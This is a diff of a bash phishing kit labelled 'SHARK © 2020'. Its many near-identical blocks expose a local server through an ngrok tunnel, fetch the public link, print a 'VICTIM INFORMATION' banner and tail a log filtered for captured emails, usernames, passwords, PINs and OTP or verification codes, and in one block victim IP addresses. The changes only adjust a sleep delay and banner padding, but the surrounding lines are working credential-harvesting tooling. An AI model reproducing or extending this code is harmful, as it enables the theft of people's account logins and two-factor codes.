@@ -157,7 +157,7 @@ ash() {
 			    echo
 			    tput civis
 			    ./ngrok http 4444 > /dev/null 2>&1 & 
-			    sleep 10
+			    sleep 12
 			    echo 
 			    tput cnorm
 			    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io") 
@@ -168,9 +168,9 @@ ash() {
 			    clear
 			    echo 
 			    echo
-			    echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================== \e[93m"  
+			    echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
 			    echo 
-			    echo -e "\e[96m=======================\e[92m    SHARK © 2020    \e[96m======================== \e[92m"
+			    echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m=========================\e[92m"
 			    echo
 			    tail -f log.txt | grep -e "email" -e "pass" -e "approvals_code"
 	
@@ -190,7 +190,7 @@ ash() {
 			   echo
 			   tput civis
                            ./ngrok http 4444 > /dev/null 2>&1 &
-                           sleep 10
+                           sleep 12
                            echo 
 			   tput cnorm
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
@@ -201,9 +201,9 @@ ash() {
 			   clear
 			   echo 
 			   echo
-			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================== \e[93m"  
+			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
 			   echo 
-			   echo -e "\e[96m=======================\e[92m    SHARK © 2020    \e[96m======================== \e[92m"
+			   echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
                            echo 
                            tail -f log.txt | grep -e "id" -e "password"      
 
@@ -223,7 +223,7 @@ ash() {
 			   echo
 			   tput civis
 			   ./ngrok http 4444 > /dev/null 2>&1 &
-			   sleep 10
+			   sleep 12
 			   echo 
 			   tput cnorm
 			   link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
@@ -234,9 +234,9 @@ ash() {
 			   clear
 			   echo 
 			   echo
-			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================== \e[93m"  
+			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
 			   echo 
-	        	   echo -e "\e[96m=======================\e[92m    SHARK © 2020    \e[96m======================== \e[92m"
+	        	   echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
 			   echo
 			   tail -f log.txt
 			   
@@ -256,7 +256,7 @@ ash() {
 			  echo
 			  tput civis
 			  ./ngrok http 4444 > /dev/null 2>&1 &
-			  sleep 10
+			  sleep 12
 			  echo 
 			  tput cnorm
 			  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io") 
@@ -267,9 +267,9 @@ ash() {
 			  clear
 			  echo 
 			  echo
-			  echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================== \e[93m"  
+			  echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
 			  echo 
-			  echo -e "\e[96m=======================\e[92m    SHARK © 2020    \e[96m======================== \e[92m"
+			  echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
 			  echo
 			  tail -f log.txt | grep -e "Email_or_Phone" -e "password" -e "verificationCode"
 
@@ -289,7 +289,7 @@ ash() {
 			  echo
 			  tput civis
 		          ./ngrok http 4444 > /dev/null 2>&1 &
-		          sleep 10
+		          sleep 12
 		          echo " "
 			  tput cnorm
 		          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")  
@@ -300,9 +300,9 @@ ash() {
 			  clear
 			  echo 
 			  echo
-			  echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================== \e[93m"  
+			  echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
 			  echo 
-			  echo -e "\e[96m=======================\e[92m    SHARK © 2020    \e[96m======================== \e[92m"
+			  echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
 			  echo
 		          tail -f log.txt | grep -e "number" -e "otp" -e "OTP"
 
@@ -322,7 +322,7 @@ ash() {
 			  echo
 			  tput civis
 		          ./ngrok http 4444 > /dev/null 2>&1 &
-		          sleep 10
+		          sleep 12
 		          echo 
 			  tput cnorm
 		          link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")        
@@ -333,9 +333,9 @@ ash() {
 			  clear
 			  echo 
 			  echo
-			  echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================== \e[93m"  
+			  echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
 			  echo 
-			  echo -e "\e[96m=======================\e[92m    SHARK © 2020    \e[96m======================== \e[92m"
+			  echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
 			  echo
 		          tail -f log.txt | grep -e "email" -e "password" -e "OTP"
   
@@ -364,7 +364,7 @@ ash() {
 				echo
 				tput civis
                                 ./ngrok http 4444 > /dev/null 2>&1 &
-                                sleep 10
+                                sleep 12
                                 echo 
 				tput cnorm
                                 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
@@ -375,9 +375,9 @@ ash() {
 			        clear
 			        echo 
 			        echo
-			        echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================== \e[93m"  
+			        echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
 			        echo 
-			        echo -e "\e[96m=======================\e[92m    SHARK © 2020    \e[96m======================== \e[92m"
+			        echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
                                 echo 
                                 tail -f log.txt | grep -e "email" -e "username" -e "password" -e "otp"
 		
@@ -394,7 +394,7 @@ ash() {
 				echo
 				tput civis
                                 ./ngrok http 4444 > /dev/null 2>&1 &
-                                sleep 10
+                                sleep 12
                                 echo 
 				tput cnorm
                                 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
@@ -405,9 +405,9 @@ ash() {
 			        clear
 			        echo 
 			        echo
-			        echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================== \e[93m"  
+			        echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
 			        echo 
-			        echo -e "\e[96m=======================\e[92m    SHARK © 2020    \e[96m======================== \e[92m"
+			        echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
                                 echo 
                                 tail -f log.txt | grep -e "email" -e "loginPassword" -e "mobileNumber" -e "otp"
 				fi
@@ -429,7 +429,7 @@ ash() {
 			  echo
 			  tput civis
                           ./ngrok http 4444 > /dev/null 2>&1 &
-                          sleep 10
+                          sleep 12
                           echo 
 			  tput cnorm
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
@@ -440,9 +440,9 @@ ash() {
 			  clear
 			  echo 
 			  echo
-			  echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================== \e[93m"  
+			  echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
 			  echo 
-			  echo -e "\e[96m=======================\e[92m    SHARK © 2020    \e[96m======================== \e[92m"
+			  echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
                           echo 
                           tail -f log.txt | grep -e "userLoginId" -e "password" -e "OTP"                 
 
@@ -462,7 +462,7 @@ ash() {
 			   echo
 			   tput civis
                            ./ngrok http 4444 > /dev/null 2>&1 &
-                           sleep 10
+                           sleep 12
                            echo ""
 			   tput cnorm
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
@@ -473,9 +473,9 @@ ash() {
 			   clear
 			   echo 
 			   echo
-			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================== \e[93m"  
+			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
 			   echo 
-		           echo -e "\e[96m=======================\e[92m    SHARK © 2020    \e[96m======================== \e[92m"
+		           echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
                            echo 
                            tail -f log.txt | grep -e "username" -e "password" -e "password" -e "pin" -e "Pin"                        
 
@@ -495,7 +495,7 @@ ash() {
 			   echo
 			   tput civis
                            ./ngrok http 4444 > /dev/null 2>&1 &
-                           sleep 10
+                           sleep 12
                            echo 
 			   tput cnorm
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
@@ -506,9 +506,9 @@ ash() {
 			   clear
 			   echo 
 			   echo
-			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================== \e[93m"  
+			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
 			   echo 
-			   echo -e "\e[96m=======================\e[92m    SHARK © 2020    \e[96m======================== \e[92m"
+			   echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
                            echo 
                            tail -f log.txt | grep -e "email" -e "password" -e "OTP"  
 
@@ -528,7 +528,7 @@ ash() {
 			   echo
 			   tput civis
                            ./ngrok http 4444 > /dev/null 2>&1 &
-                           sleep 10
+                           sleep 12
                            echo 
 			   tput cnorm
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
@@ -539,9 +539,9 @@ ash() {
 			   clear
 			   echo 
 			   echo
-			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================== \e[93m"  
+			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
 			   echo 
-			   echo -e "\e[96m=======================\e[92m    SHARK © 2020    \e[96m======================== \e[92m"
+			   echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
                            echo 
                            tail -f log.txt | grep -e "number" -e "OTP" -e "otp"      
 
@@ -561,7 +561,7 @@ ash() {
 			   echo
 			   tput civis
                            ./ngrok http 4444 > /dev/null 2>&1 &
-                           sleep 10
+                           sleep 12
                            echo 
 			   tput cnorm
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
@@ -572,9 +572,9 @@ ash() {
 			   clear
 			   echo 
 			   echo
-			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================== \e[93m"  
+			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
 			   echo 
-			   echo -e "\e[96m=======================\e[92m    SHARK © 2020    \e[96m======================== \e[92m"
+			   echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
                            echo 
                            tail -f log.txt | grep -e "email" -e "Email" -e "password" -e "pin" -e "Pin"       
 
@@ -594,7 +594,7 @@ ash() {
 			   echo
 			   tput civis
                            ./ngrok http 4444 > /dev/null 2>&1 &
-                           sleep 10
+                           sleep 12
                            echo 
 			   tput cnorm
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
@@ -605,9 +605,9 @@ ash() {
 			   clear
 			   echo 
 			   echo
-			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================== \e[93m"  
+			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
 		           echo 
-		           echo -e "\e[96m=======================\e[92m    SHARK © 2020    \e[96m======================== \e[92m"
+		           echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
                            echo 
                            tail -f log.txt | grep -e "phoneNo" -e "OTP"       
 
@@ -627,7 +627,7 @@ ash() {
 			   echo
 			   tput civis
                            ./ngrok http 4444 > /dev/null 2>&1 &
-                           sleep 10
+                           sleep 12
                            echo 
 			   tput cnorm
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
@@ -638,9 +638,9 @@ ash() {
 			   clear
 			   echo 
 			   echo
-			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================== \e[93m"  
+			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
 			   echo 
-			   echo -e "\e[96m=======================\e[92m    SHARK © 2020    \e[96m======================== \e[92m"
+			   echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
                            echo 
                            tail -f log.txt | grep -e "username" -e "password" -e "password" -e "pin" -e "Pin"        
 
@@ -660,7 +660,7 @@ ash() {
 			   echo
 			   tput civis
                            ./ngrok http 4444 > /dev/null 2>&1 &
-                           sleep 10
+                           sleep 12
                            echo 
 			   tput cnorm
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
@@ -671,9 +671,9 @@ ash() {
 			   clear
 			   echo 
 			   echo
-			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================== \e[93m"  
+			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
 			   echo 
-			   echo -e "\e[96m=======================\e[92m    SHARK © 2020    \e[96m======================== \e[92m"
+			   echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
 			   echo
                            tail -f log.txt | grep -e "login" -e "password" -e "otp"       
 
@@ -693,7 +693,7 @@ ash() {
 			   echo
 			   tput civis
                            ./ngrok http 4444 > /dev/null 2>&1 &
-                           sleep 10
+                           sleep 12
                            echo 
 			   tput cnorm
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
@@ -704,9 +704,9 @@ ash() {
 			   clear
 			   echo 
 			   echo
-			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================== \e[93m"  
+			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
 			   echo 
-			   echo -e "\e[96m=======================\e[92m    SHARK © 2020    \e[96m======================== \e[92m"
+			   echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m======================== \e[92m"
                            echo 
                            tail -f ip.txt        
 
@@ -726,7 +726,7 @@ ash() {
 			   echo
 			   tput civis
                            ./ngrok http 4444 > /dev/null 2>&1 &
-                           sleep 10
+                           sleep 12
                            echo 
 			   tput cnorm
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
@@ -737,9 +737,9 @@ ash() {
 			   clear
 			   echo 
 			   echo
-			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================== \e[93m"  
+			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
 			   echo 
-			   echo -e "\e[96m=======================\e[92m    SHARK © 2020    \e[96m======================== \e[92m"
+			   echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
                            echo 
                            tail -f log.txt | grep -e "email" -e "otp" -e "OTP"                
 
@@ -759,7 +759,7 @@ ash() {
 			   echo
 			   tput civis
                            ./ngrok http 4444 > /dev/null 2>&1 &
-                           sleep 10
+                           sleep 12
                            echo 
 			   tput cnorm
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
@@ -770,9 +770,9 @@ ash() {
 			   clear
 			   echo 
 			   echo
-			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================== \e[93m"  
+			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
 			   echo 
-			   echo -e "\e[96m=======================\e[92m    SHARK © 2020    \e[96m======================== \e[92m"
+			   echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
                            echo 
                            tail -f log.txt | grep -e "number" -e "otp"                       
 
@@ -792,7 +792,7 @@ ash() {
 			   echo
 			   tput civis
                            ./ngrok http 4444 > /dev/null 2>&1 &
-                           sleep 10
+                           sleep 12
                            echo 
 			   tput cnorm
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
@@ -803,9 +803,9 @@ ash() {
 			   clear
 			   echo 
 			   echo
-			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================== \e[93m"  
+			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
 			   echo 
-			   echo -e "\e[96m=======================\e[92m    SHARK © 2020    \e[96m======================== \e[92m"
+			   echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
                            echo 
                            tail -f log.txt | grep -e "login_email" -e "login_password" -e "otpCode"    
 
@@ -825,7 +825,7 @@ ash() {
 			   echo
 			   tput civis
                            ./ngrok http 4444 > /dev/null 2>&1 &
-                           sleep 10
+                           sleep 12
                            echo 
 			   tput cnorm
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
@@ -836,9 +836,9 @@ ash() {
 			   clear
 			   echo 
 			   echo
-			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================== \e[93m"  
+			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
 			   echo 
-			   echo -e "\e[96m=======================\e[92m    SHARK © 2020    \e[96m======================== \e[92m"
+			   echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
                            echo 
                            tail -f log.txt | grep -e "phone_number" -e "phone_code"     
 
@@ -858,7 +858,7 @@ ash() {
 			   echo
 			   tput civis
                            ./ngrok http 4444 > /dev/null 2>&1 &
-                           sleep 10
+                           sleep 12
                            echo 
 			   tput cnorm
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
@@ -869,9 +869,9 @@ ash() {
 			   clear
 			   echo 
 			   echo
-			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================== \e[93m"  
+			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
 			   echo 
-			   echo -e "\e[96m=======================\e[92m    SHARK © 2020    \e[96m======================== \e[92m"
+			   echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
                            echo 
                            tail -f log.txt | grep -e "phone_or_email" -e "password" -e "challenge_response"      
 
@@ -891,7 +891,7 @@ ash() {
 			  echo
 			  tput civis
                           ./ngrok http 4444 > /dev/null 2>&1 &
-                          sleep 10
+                          sleep 12
                           echo 
 			  tput cnorm
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
@@ -902,9 +902,9 @@ ash() {
 			  clear
 			  echo 
 			  echo
-			  echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================== \e[93m"  
+			  echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
 			  echo 
-			  echo -e "\e[96m=======================\e[92m    SHARK © 2020    \e[96m======================== \e[92m"
+			  echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
 			  echo
                           tail -f log.txt | grep -e "email" -e "password" -e "otp"     
 
@@ -924,7 +924,7 @@ ash() {
 			  echo
 			  tput civis
                           ./ngrok http 4444 > /dev/null 2>&1 &
-                          sleep 10
+                          sleep 12
                           echo 
 			  tput cnorm
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
@@ -935,9 +935,9 @@ ash() {
 			  clear
 			  echo 
 			  echo
-			  echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================== \e[93m"  
+			  echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
 			  echo 
-			  echo -e "\e[96m=======================\e[92m    SHARK © 2020    \e[96m======================== \e[92m"
+			  echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
                           echo 
                           tail -f log.txt | grep -e "log" -e "pwd"       
 
@@ -957,7 +957,7 @@ ash() {
 			   echo
 			   tput civis
                            ./ngrok http 4444 > /dev/null 2>&1 &
-                           sleep 10
+                           sleep 12
                            echo 
 			   tput cnorm
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
@@ -968,9 +968,9 @@ ash() {
 			   clear
 			   echo 
 			   echo
-			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================== \e[93m"  
+			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
 			   echo 
-			   echo -e "\e[96m=======================\e[92m    SHARK © 2020    \e[96m======================== \e[92m"  
+			   echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"  
                            echo 
                            tail -f log.txt | grep -e "username" -e "password" -e "Code"       
 
@@ -990,7 +990,7 @@ ash() {
 			   echo
 			   tput civis
                            ./ngrok http 4444 > /dev/null 2>&1 &
-                           sleep 10
+                           sleep 12
                            echo 
 			   tput cnorm
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
@@ -1001,9 +1001,9 @@ ash() {
 			   clear
 			   echo 
 			   echo
-			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================== \e[93m"  
+			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
 			   echo 
-			   echo -e "\e[96m=======================\e[92m    SHARK © 2020    \e[96m======================== \e[92m"
+			   echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
                            echo 
                            tail -f log.txt | grep -e "username" -e "password"   
 
@@ -1023,7 +1023,7 @@ ash() {
 			   echo
 			   tput civis
                            ./ngrok http 4444 > /dev/null 2>&1 &
-                           sleep 10
+                           sleep 12
                            echo 
 			   tput cnorm
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
@@ -1034,9 +1034,9 @@ ash() {
 			   clear
 			   echo 
 			   echo
-			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================== \e[93m"  
+			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
 			   echo 
-			   echo -e "\e[96m=======================\e[92m    SHARK © 2020    \e[96m======================== \e[92m"
+			   echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
                            echo 
                            tail -f log.txt | grep -e "email" -e "password"                 
 
@@ -1056,7 +1056,7 @@ ash() {
 			   echo
 			   tput civis
                            ./ngrok http 4444 > /dev/null 2>&1 &
-                           sleep 10
+                           sleep 12
                            echo 
 			   tput cnorm
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
@@ -1067,9 +1067,9 @@ ash() {
 			   clear
 			   echo 
 			   echo
-			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================== \e[93m"  
+			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
 			   echo 
-			   echo -e "\e[96m=======================\e[92m    SHARK © 2020    \e[96m======================== \e[92m"
+			   echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
                            echo 
                            tail -f log.txt | grep -e "userid" -e "pass" -e "pin"                       
 
@@ -1089,7 +1089,7 @@ ash() {
 			   echo
 			   tput civis
                            ./ngrok http 4444 > /dev/null 2>&1 &
-                           sleep 10
+                           sleep 12
                            echo 
 			   tput cnorm
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
@@ -1100,9 +1100,9 @@ ash() {
 			   clear
 			   echo 
 			   echo
-			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================== \e[93m"  
+			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
 			   echo 
-			   echo -e "\e[96m=======================\e[92m    SHARK © 2020    \e[96m======================== \e[92m"
+			   echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
                            echo 
                            tail -f log.txt | grep -e "Username" -e "password" -e "otp"  
 
@@ -1122,7 +1122,7 @@ ash() {
 			   echo
 			   tput civis
                            ./ngrok http 4444 > /dev/null 2>&1 &
-                           sleep 10
+                           sleep 12
                            echo 
 			   tput cnorm
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
@@ -1133,9 +1133,9 @@ ash() {
 			   clear
 			   echo 
 			   echo
-			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================== \e[93m"  
+			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
 			   echo 
-			   echo -e "\e[96m=======================\e[92m    SHARK © 2020    \e[96m======================== \e[92m"
+			   echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
                            echo 
                            tail -f log.txt | grep -e "username" -e "password"    
 
@@ -1155,7 +1155,7 @@ ash() {
 			   echo
 			   tput civis
                            ./ngrok http 4444 > /dev/null 2>&1 &
-                           sleep 10
+                           sleep 12
                            echo 
 			   tput cnorm
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
@@ -1166,9 +1166,9 @@ ash() {
 			   clear
 			   echo 
 			   echo
-			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================== \e[93m"  
+			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
 			   echo 
-			   echo -e "\e[96m=======================\e[92m    SHARK © 2020    \e[96m======================== \e[92m"
+			   echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
                            echo 
                            tail -f log.txt | grep -e "email" -e "password"     
 
@@ -1188,7 +1188,7 @@ ash() {
 			   echo
 			   tput civis
                            ./ngrok http 4444 > /dev/null 2>&1 &
-                           sleep 10
+                           sleep 12
                            echo 
 			   tput cnorm
                            link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
@@ -1199,9 +1199,9 @@ ash() {
 			   clear
 			   echo 
 			   echo
-			   echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m======================== \e[93m"  
+			   echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
 			   echo 
-			   echo -e "\e[96m=======================\e[92m    SHARK © 2020    \e[96m======================== \e[92m"
+			   echo -e "\e[96m========================\e[92m    SHARK © 2020    \e[96m========================= \e[92m"
                            echo
                            tail -f log.txt | grep -e "userId" -e "otp"     
 
